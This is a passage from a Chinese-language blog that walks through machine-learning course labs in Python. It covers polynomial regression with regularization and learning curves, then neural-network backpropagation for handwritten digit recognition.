X_poly</span><br></pre></td></tr></table></figure>
<ul>
<li>先对矩阵 X 进行“扩充”，然后提高对应特征的次方（姑且这么理解）</li>
</ul>
<p>实现 featureNormalize 函数：把数据特征标准化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">feature_nomalize</span>(<span class="params">X</span>):</span></span><br><span class="line">	mu = np.mean(X,<span class="number">0</span>) <span class="comment"># 计算每一维度的均值</span></span><br><span class="line">	sigma = np.std(X,<span class="number">0</span>,ddof=<span class="number">1</span>) <span class="comment"># 计算沿指定轴的标准差</span></span><br><span class="line">	X_norm = (X - mu)/sigma</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> X_norm,mu,sigma</span><br></pre></td></tr></table></figure>
<ul>
<li>从数据集中减去每个特征的平均值</li>
<li>减去平均值后，再将特征值按各自的“标准偏差”进行缩放（除）</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =============================== 5.投影特征为多项式 ================</span></span><br><span class="line">p = <span class="number">8</span></span><br><span class="line"><span class="comment"># 投影和标准化训练集</span></span><br><span class="line">X_poly = ploy_feature(X,p)</span><br><span class="line">X_poly,mu,sigma = feature_nomalize(X_poly)</span><br><span class="line">X_poly = np.column_stack((np.ones(Y.size),X_poly)) <span class="comment"># 将一维数组作为列堆叠到二维数组中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 投影和标准化验证集</span></span><br><span class="line">X_poly_val = ploy_feature(Xval,p)</span><br><span class="line">X_poly_val -= mu</span><br><span class="line">X_poly_val /= sigma</span><br><span class="line">X_poly_val = np.column_stack((np.ones(Yval.size),X_poly_val))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 投影和标准化测试集</span></span><br><span class="line">X_poly_test = ploy_feature(Xtest,p)</span><br><span class="line">X_poly_test -= mu</span><br><span class="line">X_poly_test /= sigma</span><br><span class="line">X_poly_test = np.column_stack((np.ones(Ytest.size),X_poly_test))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Normalized Training Example 1 : \n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(X_poly[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<h2 id="Learning-curves-B（学习曲线）"><a href="#Learning-curves-B（学习曲线）" class="headerlink" title="Learning curves B（学习曲线）"></a>Learning curves B（学习曲线）</h2><p>然后我们利用标准化的多项式数据来绘制学习曲线：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======================== 6.多项式特征的学习曲线 ===============</span></span><br><span class="line">lmd = <span class="number">0</span></span><br><span class="line"><span class="comment"># 绘制拟合曲线</span></span><br><span class="line">theta = train_linear_reg(X_poly,Y,lmd) <span class="comment"># 拟合函数fmincg </span></span><br><span class="line">x_fit,y_fit = plot_fit(np.<span class="built_in">min</span>(X),np.<span class="built_in">max</span>(X),mu,sigma,theta,p) <span class="comment"># 绘制多项式拟合图</span></span><br><span class="line">plt.figure(<span class="number">3</span>)</span><br><span class="line">plt.scatter(X,Y,c=<span class="string">&#x27;r&#x27;</span>,marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">plt.plot(x_fit,y_fit)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Change in water level (x)&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Water folowing out of the dam (y)&#x27;</span>)</span><br><span class="line">plt.ylim([-<span class="number">60</span>, <span class="number">40</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Polynomial Regression Fit (lambda = &#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(lmd))</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment"># 计算代价误差</span></span><br><span class="line">error_train, error_val = learning_curve(X_poly, Y, X_poly_val, Yval, lmd)</span><br><span class="line">plt.figure(<span class="number">4</span>)</span><br><span class="line">plt.plot(np.arange(m), error_train, np.arange(m), error_val)</span><br><span class="line">plt.title(<span class="string">&#x27;Polynomial Regression Learning Curve (lambda = &#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(lmd))</span><br><span class="line">plt.legend([<span class="string">&#x27;Train&#x27;</span>, <span class="string">&#x27;Cross Validation&#x27;</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Number of Training Examples&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">plt.axis([<span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">150</span>])</span><br><span class="line">plt.show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Polynomial Regression (lambda = &#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(lmd))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;# Training Examples\tTrain Error\t\tCross Validation Error&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  \t&#123;&#125;\t\t&#123;&#125;\t&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i, error_train[i], error_val[i]))</span><br></pre></td></tr></table></figure>
<p>得到两张图片：（lmd = 0，无正则化）</p>
<p>一，拟合曲线（横坐标：水库水位的变化，纵坐标：从大坝流出的水）：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652768194001.png" class width="1652768194001"> 
<ul>
<li>您应该看到多项式拟合能够很好地遵循数据点，因此获得了较低的训练误差</li>
<li>然而，多项式拟合非常复杂，甚至在极端情况下会下降</li>
<li>这是多项式回归模型 <strong>过度拟合</strong> 训练数据并且不能很好地泛化的指标</li>
</ul>
<p>二，学习曲线：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652768217539.png" class width="1652768217539"> 
<ul>
<li>注意：蓝线一直在最下面</li>
<li>您可以看到学习曲线在低训练误差低但交叉验证误差高的情况下表现出相同的效果</li>
<li>训练和交叉验证错误之间存在差距，表明存在高方差问题</li>
</ul>
<h2 id="Adjusting-the-regularization-parameter（调整正则化参数）"><a href="#Adjusting-the-regularization-parameter（调整正则化参数）" class="headerlink" title="Adjusting the regularization parameter（调整正则化参数）"></a>Adjusting the regularization parameter（调整正则化参数）</h2><p>在本节中，您将观察正则化参数如何影响正则化多项式回归的偏差方差（主要是通过正则化来消除过拟合的影响）</p>
<p>您现在应该修改 ex5.m 中的 lambda 参数并尝试 λ = [1, 100]，对于这些值中的每一个，脚本应该生成适合数据的多项式以及学习曲线</p>
<p>其实就是把上一部分的 “λ=0” 修改为其他值</p>
<ul>
<li>lmd = 1：</li>
</ul>
<img src="/2022/05/17/Machine-Learning-Lab5/1652769307897.png" class width="1652769307897"> 
<img src="/2022/05/17/Machine-Learning-Lab5/1652769200655.png" class width="1652769200655"> 
<ul>
<li>lmd = 100：</li>
</ul>
<img src="/2022/05/17/Machine-Learning-Lab5/1652769491692.png" class width="1652769491692"> 
<img src="/2022/05/17/Machine-Learning-Lab5/1652769505258.png" class width="1652769505258"> 
<p>可以对比一下“λ=0”，“λ=1”，“λ=100”，对模型过拟合的影响（明显“λ=1”的模型效果最好）</p>
<h2 id="Selecting-λ-using-a-cross-validation-set（使用交叉验证集选择λ）"><a href="#Selecting-λ-using-a-cross-validation-set（使用交叉验证集选择λ）" class="headerlink" title="Selecting λ using a cross validation set（使用交叉验证集选择λ）"></a>Selecting λ using a cross validation set（使用交叉验证集选择λ）</h2><p>从练习的前面部分中，您观察到 λ 的值会显着影响正则化多项式回归，在训练集和交叉验证集上的结果</p>
<ul>
<li>特别是，没有正则化（λ = 0）的模型很好地拟合了训练集，但不能泛化</li>
<li>相反，正则化过多（λ = 100）的模型不能很好地拟合训练集和测试集</li>
<li>一个好的 λ 选择（λ = 1）可以很好地拟合数据</li>
</ul>
<p>在本节中，您将实现一个自动方法来选择 λ 参数，具体来说，您将使用交叉验证集来评估每个 λ 值的好坏，在使用交叉验证集选择最佳 λ 值后，我们可以在测试集上评估模型，以估计模型在实际看不见的数据上的表现</p>
<p>您的任务是完成 validationCurve.m 中的代码</p>
<ul>
<li>具体来说，您应该使用 trainLinearReg 函数使用不同的 λ 值训练模型</li>
<li>并计算训练误差和交叉验证误差</li>
<li>您应该在以下范围内尝试 λ：{0, 0.001, 0.003, 0.01, 0.03, 0.1, 0.3, 1, 3, 10}</li>
</ul>
<p>实现 validationCurve 函数：生成交叉验证曲线 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> linearCostFunction <span class="keyword">import</span> linear_cost_function</span><br><span class="line"><span class="keyword">from</span> trainLinearRegression <span class="keyword">import</span> train_linear_reg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validation_curve</span>(<span class="params">X,Y,Xval,Yval</span>):</span></span><br><span class="line">	lambda_vec = np.array([<span class="number">0.</span>, <span class="number">0.001</span>, <span class="number">0.003</span>, <span class="number">0.01</span>, <span class="number">0.03</span>, <span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">10</span>])</span><br><span class="line">	error_train = np.zeros(lambda_vec.size)</span><br><span class="line">	error_val = np.zeros(lambda_vec.size)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(lambda_vec.size):</span><br><span class="line">		lmd = lambda_vec[num]</span><br><span class="line">		theta = train_linear_reg(X,Y,lmd)</span><br><span class="line">		error_train[num],_ = linear_cost_function(X,Y,theta,lmd)</span><br><span class="line">		error_val[num],_ = linear_cost_function(Xval,Yval,theta,lmd)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> lambda_vec,error_train,error_val</span><br></pre></td></tr></table></figure>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ============== 7.通过交叉验证集选择正则项系数lambda =========</span></span><br><span class="line">lambda_vec,error_train,error_val = validation_curve(X_poly,Y,X_poly_test,Ytest)</span><br><span class="line">plt.figure(<span class="number">5</span>)</span><br><span class="line">plt.plot(lambda_vec, error_train, lambda_vec, error_val)</span><br><span class="line">plt.legend([<span class="string">&#x27;Train&#x27;</span>, <span class="string">&#x27;Test Validation&#x27;</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;lambda&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘制图像：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652770124267.png" class width="1652770124267"> 
<ul>
<li>我们可以看到 λ 的最佳值在“3”左右（由于数据集的训练和验证拆分的随机性，交叉验证误差有时可能低于训练错误）</li>
</ul>
<p>PS：lmd = 3：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652770295732.png" class width="1652770295732"> 
<p>可以发现：误差的确比 “lmd=1” 还要小</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/15/Machine-Learning-Lab4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/15/Machine-Learning-Lab4/" class="post-title-link" itemprop="url">Machine-Learning-Lab4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-15 16:19:51" itemprop="dateCreated datePublished" datetime="2022-05-15T16:19:51+08:00">2022-05-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:08:18" itemprop="dateModified" datetime="2022-10-10T00:08:18+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将实现神经网络的反向传播算法，并将其应用于手写数字识别任务</p>
<ul>
<li>ex4.m - Octave/MATLAB 脚本帮助您完成练习</li>
<li>ex4data1.mat - 手写数字训练集</li>
<li>ex4weights.mat - 神经网络训练的初始权重</li>
<li>submit.m - 提交脚本，将您的解决方案发送到我们的服务器</li>
<li>displayData.m - 帮助可视化数据集的函数</li>
<li>fmincg.m - 功能最小化例行程序（类似于fminunc）</li>
<li>sigmoid.m - Sigmoid 函数（假设陈述）</li>
<li>computeNumericalGradient.m - 计算梯度(倒数)的函数</li>
<li>checkNNGradients.m - 帮助检查梯度的函数（梯度检测）</li>
<li>debugInitializeWeights.m - 初始化权重的函数</li>
<li>predict.m - 神经网络预测函数</li>
<li>[?] sigmoidGradient.m - 计算sigmoid函数的梯度</li>
<li>[?] randInitializeWeights.m - 随机初始化权重</li>
<li>[?] nnCostFunction.m - 神经网络代价函数</li>
</ul>
<h2 id="Neural-Networks（神经网络）"><a href="#Neural-Networks（神经网络）" class="headerlink" title="Neural Networks（神经网络）"></a>Neural Networks（神经网络）</h2><p>在上一个练习中，您实现了神经网络的前馈传播，并使用它使用我们提供的权重预测手写数字</p>
<p>在本练习中，您将实现反向传播算法来学习神经网络的参数，提供的脚本 ex4.m 将帮助你逐步完成这个练习</p>
<p>这与您在上一个练习中使用的数据集相同，ex3data1.mat中有5000个培训示例：</p>
<ul>
<li>其中每个训练示例是数字的 20x20 像素灰度图像</li>
<li>每个像素由一个浮点数表示，表示该位置的灰度强度</li>
<li>20×20 的像素网格被“展开”成400维向量，这些训练示例中的每一个都成为我们的数据矩阵X中的一行</li>
<li>这给了我们一个 5000×400 的矩阵X，其中每一行都是手写数字图像的训练示例</li>
<li>训练集的第二部分是 5000 维向量 y，其中包含训练集的标签</li>
<li>为了与 Octave/MATLAB 索引更兼容，在没有零索引的情况下，我们将数字0映射到值10，因此，“0”数字标记为“10”，而数字“1”至“9”按其自然顺序标记为“1”至“9”</li>
</ul>
<h2 id="Visualizing-the-data（可视化数据）"><a href="#Visualizing-the-data（可视化数据）" class="headerlink" title="Visualizing the data（可视化数据）"></a>Visualizing the data（可视化数据）</h2><p>绘制的过程和上一个实验一样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==================== 1.读取数据，并显示随机样例 ==============================</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data\ex4data1.mat&#x27;</span>) <span class="comment"># 使用scipy.io中的函数读取mat文件,data的格式是字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据关键字,分别获得输入数据和输出的真值</span></span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">Y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机取出其中的100个样本,显示结果</span></span><br><span class="line">m = X.shape[<span class="number">0</span>] <span class="comment"># m:矩阵长度</span></span><br><span class="line">rand_indices = np.random.permutation(<span class="built_in">range</span>(m)) <span class="comment"># 把[0,m-1]的数据随机排序</span></span><br><span class="line">selected = X[rand_indices[<span class="number">1</span>:<span class="number">100</span>],:] <span class="comment"># 排序后取前100个样本</span></span><br><span class="line">display_data(selected) <span class="comment"># 显示手写数字样例(这里不展示了)</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘制的图像：</p>
<img src="/2022/05/15/Machine-Learning-Lab4/1652529225830.png" class width="1652529225830"> 
<h2 id="Model-representation（模型表示）"><a href="#Model-representation（模型表示）" class="headerlink" title="Model representation（模型表示）"></a>Model representation（模型表示）</h2><p>我们的神经网络它有三层——输入层、隐藏层和输出层</p>
<img src="/2022/05/15/Machine-Learning-Lab4/1652529620297.png" class width="1652529620297"> 
<ul>
<li>我们的输入是3位数图像的像素值，由于图像的大小为 20×20，这给了我们 400 个输入层单元（不包括总是输出+1的额外偏置单元）</li>
<li>训练数据将由 ex4.m 脚本加载到变量X和y中</li>
<li>我们已经向您提供了一套我们已经培训过的网络参数（θ(1)，θ(2)）这些都存储在 ex4weights.m 中，并将由 ex4.m 加载</li>
</ul>
<h2 id="Feedforward-and-cost-function（正向传播和代价函数）"><a href="#Feedforward-and-cost-function（正向传播和代价函数）" class="headerlink" title="Feedforward and cost function（正向传播和代价函数）"></a>Feedforward and cost function（正向传播和代价函数）</h2><p>现在你将实现神经网络的代价函数和梯度，首先，在 nnCostFunction.m 中完成代码，神经网络的代价函数是：</p>
<script type="math/tex; mode=display">
J(θ)=-\frac{1}{m}[\sum_{i=1}^{m}\sum_{k=1}^{K}y_k^{(i)}log(h_θ(x^{(i)}))_k+(1-y_k^{(i)})log(1-(h_θ(x^{(i)}))_k)]+
\frac{λ}{2m}\sum_{l=1}^{L-1}\sum_{i=1}^{s1}\sum_{j=1}^{s1+1}(θ_{ji}^{(l)})^2</script><p>这里的 hθ(x) 就可以是逻辑回归中的 Sigmoid 函数（假设陈述），而 θ 就是模型的参数向量（在神经网络中也被称为“权重”）</p>
<p>K=10 是可能标签的总数，注意：虽然原始标签（在变量y中）是 1,2,3……10 为了训练神经网络，我们需要将标签重新编码为只包含值0或1的向量</p>
<img src="/2022/05/15/Machine-Learning-Lab4/1652530998468.png" class width="1652530998468"> 
<p>实现过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==================== 2.读取参数，并计算代价 ==================================</span></span><br><span class="line">weights = scio.loadmat(<span class="string">&#x27;data\ex4weights.mat&#x27;</span>)</span><br><span class="line">theta1 = weights[<span class="string">&#x27;Theta1&#x27;</span>]	</span><br><span class="line">theta2 = weights[<span class="string">&#x27;Theta2&#x27;</span>]	</span><br><span class="line">nn_paramters = np.concatenate([theta1.flatten(),theta2.flatten()],axis =<span class="number">0</span>) <span class="comment"># 把theta1,theta2转化为一维数组后,进行拼接</span></span><br><span class="line"><span class="comment"># 设置参数</span></span><br><span class="line">input_layer = <span class="number">400</span></span><br><span class="line">hidden_layer = <span class="number">25</span></span><br><span class="line">out_layer = <span class="number">10</span></span><br><span class="line"><span class="comment"># 计算代价,无正则项</span></span><br><span class="line">lmd = <span class="number">0</span></span><br><span class="line">cost,grad = nn_cost_function(X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at parameters (loaded from ex4weights): &#123;:0.6f&#125;\n(This value should be about 0.287629)&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="comment"># 计算代价,带入正则项</span></span><br><span class="line">lmd = <span class="number">1</span></span><br><span class="line">cost,grad = nn_cost_function(X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at parameters (loaded from ex4weights): &#123;:0.6f&#125;\n(This value should be about 0.383770)&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="comment"># 验证sigmoid的梯度</span></span><br><span class="line">g = sigmoid_gradient(np.array([-<span class="number">1</span>, -<span class="number">0.5</span>, <span class="number">0</span>, <span class="number">0.5</span>, <span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Sigmoid gradient evaluated at [-1  -0.5  0  0.5  1]:\n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(g))</span><br></pre></td></tr></table></figure>
<ul>
<li>flatten()：把数组变成一列的形式，等价于 reshape</li>
<li>concatenate(a1,a2,…)：能够一次完成多个数组的拼接，其中 a1,a2,… 是数组类型的参数 </li>
</ul>
<p>接下来就分析分析最核心的两个函数：sigmoid_gradient，nn_cost_function</p>
<ul>
<li>sigmoid_gradient：计算 sigmoid 函数的梯度（后面会详细分析）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">z</span>):</span></span><br><span class="line">	g = <span class="number">1</span>/(<span class="number">1</span>+np.exp(-z)) <span class="comment"># 就是Sigmoid函数</span></span><br><span class="line">	<span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid_gradient</span>(<span class="params">z</span>):</span></span><br><span class="line">	grad = sigmoid(z) * (<span class="number">1</span>-sigmoid(z))</span><br><span class="line">	<span class="keyword">return</span> grad</span><br></pre></td></tr></table></figure>
<ul>
<li>nn_cost_function：用于计算代价（代价函数-交叉熵）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid</span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid_gradient</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nn_cost_function</span>(<span class="params">X,Y,nn_paramters,input_layer,hidden_layer,out_layer,lmd=<span class="number">0</span></span>):</span></span><br><span class="line">    </span><br><span class="line">	theta1 = nn_paramters[:hidden_layer*(input_layer+<span class="number">1</span>)].reshape(hidden_layer,input_layer+<span class="number">1</span>) <span class="comment"># 取出theta1</span></span><br><span class="line">	theta2 = nn_paramters[hidden_layer*(input_layer+<span class="number">1</span>):].reshape(out_layer,hidden_layer+<span class="number">1</span>) <span class="comment"># 取出theta2</span></span><br><span class="line">	m = Y.size <span class="comment"># 获取样本数目</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 输入层的输出等于输入,X增加一列偏置维度</span></span><br><span class="line">	a1 = np.column_stack((np.ones(X.shape[<span class="number">0</span>]),X)) <span class="comment"># 5000*401</span></span><br><span class="line">	<span class="comment"># 隐藏层的输入和输出</span></span><br><span class="line">	z2 = a1.dot(theta1.T) <span class="comment"># 5000*25</span></span><br><span class="line">	a2 = sigmoid(z2)</span><br><span class="line">	a2 = np.column_stack((np.ones(a2.shape[<span class="number">0</span>]),a2)) <span class="comment"># 5000*26</span></span><br><span class="line">	<span class="comment"># 输出层的输入和输出</span></span><br><span class="line">	z3 = a2.dot(theta2.T) <span class="comment"># 5000*10</span></span><br><span class="line">	a3 = sigmoid(z3) <span class="comment"># 5000*10</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment"># a3[m,k]表示第m个样本预测属于k的概率(因为激活函数是logistic函数)</span></span><br><span class="line">	<span class="comment"># 根据Y的值,也转换成和a3相同格式的数组</span></span><br><span class="line">	<span class="comment"># yk中每一行只能有一列值为1,yk[m,k]=1表示第m个样本的真实输出是k,其他列为0</span></span><br><span class="line">	yk = np.zeros((m,out_layer))</span><br><span class="line">	<span class="comment"># 注意:Y中的取值范围是[1,10],而yk中的列下标范围是[0,9]</span></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(Y.size):</span><br><span class="line">		yk[num,Y[num]-<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">	<span class="comment"># 计算代价,因为输出层的激活函数是logistic函数,所有代价也是以logistic regression代价函数</span></span><br><span class="line">	cost_arr = - yk * np.log(a3) - (<span class="number">1</span>-yk) * np.log(<span class="number">1</span>-a3)</span><br><span class="line">	cost = cost_arr.<span class="built_in">sum</span>()/m + lmd /(<span class="number">2</span>*m) *( (theta1[:,<span class="number">1</span>:] **<span class="number">2</span>).<span class="built_in">sum</span>() + (theta2[:,<span class="number">1</span>:] **<span class="number">2</span>).<span class="built_in">sum</span>())</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 使用BP算法计算梯度</span></span><br><span class="line">	delta3 = a3 - yk <span class="comment"># 5000*10</span></span><br><span class="line"></span><br><span class="line">	delta2 = delta3.dot(theta2) * sigmoid_gradient(np.column_stack((np.ones(z2.shape[<span class="number">0</span>]),z2)))</span><br><span class="line">	delta2 = delta2[:,<span class="number">1</span>:] <span class="comment"># 5000*25</span></span><br><span class="line">	<span class="comment"># theta1的梯度</span></span><br><span class="line">	theta1_grad = np.zeros(theta1.shape) <span class="comment"># 25 x 401</span></span><br><span class="line">	theta1_grad = theta1_grad + (delta2.T).dot(a1) <span class="comment"># 25*401</span></span><br><span class="line">	nn_parameter1_grad = theta1_grad/m + (lmd/m) * 